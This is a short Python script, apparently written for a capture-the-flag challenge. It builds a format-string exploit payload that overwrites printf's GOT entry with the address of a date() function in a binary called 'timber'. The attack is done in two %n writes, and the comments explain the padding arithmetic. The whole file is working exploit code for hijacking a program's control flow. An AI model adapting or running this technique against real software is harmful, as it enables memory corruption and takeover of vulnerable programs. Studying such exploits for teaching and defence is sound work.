import struct
#Goal: Overwrite the GOT entry of printf() with address of date().
printf_plt = 0x804b010
date_address = 0x804867b
#Note: BE CAREFUL NOT TO USE GOTCHAR LATER ON! that address is at 0x804b014, which is printf_plt + 4
#We will need to do this in two writes: One writes 0x867b to printf_plt, and the next writes 0x804 to printf_plt + 2.
string = ""
string += struct.pack("I", printf_plt) #Write num. 1 location
string += struct.pack("I", printf_plt + 2) #Write num. 2 location
string += "%2$34419x" #34419 is 0x867b - 8 in decimal (We subtract 8 to account for the stuff we've printed so far before this part)
string += "%2$n" #first write complete
#We now have a problem. We have written 0x867b bytes to stdout, but we must write 0x804 to printf_plt + 2!
#Since we cannot write negative bytes, we have to write 0x10804 bytes to printf_plt + 2 instead, and hope to god that putchar is not used
string += "%3$33161x" #33161 is 0x10804 - 0x867b
string += "%3$n"
print(string) #Prints the output string, which we can then redirect into ./timber :D
